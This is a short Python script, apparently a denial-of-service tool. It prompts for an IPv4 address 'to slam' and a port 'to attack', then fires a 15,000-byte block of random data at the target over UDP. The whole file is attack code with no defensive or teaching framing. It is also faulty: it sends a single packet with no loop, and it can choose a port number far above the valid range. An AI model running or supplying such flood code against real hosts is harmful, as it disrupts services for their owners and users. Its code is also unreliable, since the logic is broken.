import socket
import random

def FLOOD():
    ip = input("IPV4 TO SLAM: ")
    port = int(input("Port to attack: "))
    randport = (True, False)[port == 0]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(15000)
    port = (random.randint(1, 15000000), port)[randport]
    s.sendto(bytes_data, (ip, port))
FLOOD()
